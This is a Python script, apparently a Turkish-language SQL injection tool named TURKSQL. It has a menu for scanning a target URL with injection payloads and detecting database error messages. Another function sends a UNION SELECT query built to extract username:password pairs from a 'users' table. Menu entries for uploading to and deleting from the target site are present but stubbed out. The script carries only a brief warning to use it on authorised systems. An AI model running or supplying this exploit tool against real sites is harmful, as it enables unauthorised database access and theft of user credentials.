#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import requests
import time
from bs4 import BeautifulSoup

# Renk kodları
BLUE = "\033[1;94m"
GREEN = "\033[1;92m"
RED = "\033[1;91m"
YELLOW = "\033[1;93m"
END = "\033[0m"

# Banner
def banner():
    os.system("clear")
    print(f"""{BLUE}
  __________  _____ ____    __ 
 /_  __/ __ \/ ___// __ \  / / 
  / / / /_/ /\__ \/ / / / / /  
 / / / _, _/___/ / /_/ / / /___
/_/ /_/ |_|/____/\___\_\/_____/

    {END}""")
    print(f"{YELLOW}\nTURKSQL - Türkçe SQL Injection Test Aracı{END}")
    print(f"{RED}UYARI: Bu araç sadece yasal ve izin verilen sistemlerde kullanılmalıdır!{END}\n")

# Ana menü
def main_menu():
    banner()
    print(f"{GREEN}[1]{END} SQL Açığı Taraması")
    print(f"{GREEN}[2]{END} Siteden Veri Çekme")
    print(f"{GREEN}[3]{END} Siteye Veri Yükleme")
    print(f"{GREEN}[4]{END} Sitedeki Verileri Silme")
    print(f"{GREEN}[0]{END} Çıkış\n")
    
    try:
        choice = int(input(f"{BLUE}Seçiminiz (0-4): {END}"))
        return choice
    except:
        return -1

# SQL Açığı Taraması
def sql_tarama():
    banner()
    print(f"{GREEN}[*] SQL Açığı Taraması{END}\n")
    url = input(f"{BLUE}Hedef URL (örn: http://site.com/page.php?id=1): {END}")
    
    payloads = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1 -- -",
        "' UNION SELECT 1,2,3 -- -"
    ]
    
    print(f"\n{YELLOW}[*] Tarama başlatılıyor...{END}")
    
    for payload in payloads:
        try:
            test_url = f"{url}{payload}"
            response = requests.get(test_url, timeout=5)
            
            error_patterns = [
                "SQL syntax",
                "MySQL",
                "syntax error",
                "unclosed quotation mark",
                "Warning: mysql"
            ]
            
            if any(error in response.text for error in error_patterns):
                print(f"{GREEN}[+] Açık bulundu! Kullanılan payload: {payload}{END}")
                return True
                
        except Exception as e:
            print(f"{RED}[-] Hata: {str(e)}{END}")
    
    print(f"{RED}[-] SQL Injection açığı bulunamadı{END}")
    return False

# Siteden Veri Çekme
def veri_cekme():
    banner()
    print(f"{GREEN}[*] Siteden Veri Çekme{END}\n")
    url = input(f"{BLUE}Hedef URL (SQL açığı olan sayfa): {END}")
    
    if not sql_tarama():
        print(f"{RED}[-] Önce SQL açığını doğrulayın!{END}")
        return
    
    print(f"\n{YELLOW}[*] Veri çekme işlemi başlatılıyor...{END}")
    
    try:
        # Örnek bir UNION-based SQL Injection
        exploit_url = f"{url} UNION SELECT 1,concat(username,':',password),3 FROM users -- -"
        response = requests.get(exploit_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        print(f"\n{GREEN}[+] Çekilen veriler:{END}")
        print(soup.get_text()[:500])  # İlk 500 karakteri göster
        
    except Exception as e:
        print(f"{RED}[-] Hata: {str(e)}{END}")

# Ana program
if __name__ == "__main__":
    try:
        while True:
            secim = main_menu()
            
            if secim == 1:
                sql_tarama()
            elif secim == 2:
                veri_cekme()
            elif secim == 3:
                print(f"\n{YELLOW}[!] Bu özellik geliştirme aşamasındadır{END}")
            elif secim == 4:
                print(f"\n{RED}[!] Bu özellik etik nedenlerle kaldırılmıştır{END}")
            elif secim == 0:
                print(f"\n{GREEN}[*] Çıkış yapılıyor...{END}")
                break
            else:
                print(f"\n{RED}[-] Geçersiz seçim!{END}")
            
            input(f"\n{BLUE}Devam etmek için Enter'a basın...{END}")
            
    except KeyboardInterrupt:
        print(f"\n{RED}[-] Program kapatılıyor...{END}")
    except Exception as e:
        print(f"\n{RED}[-] Beklenmeyen hata: {str(e)}{END}")
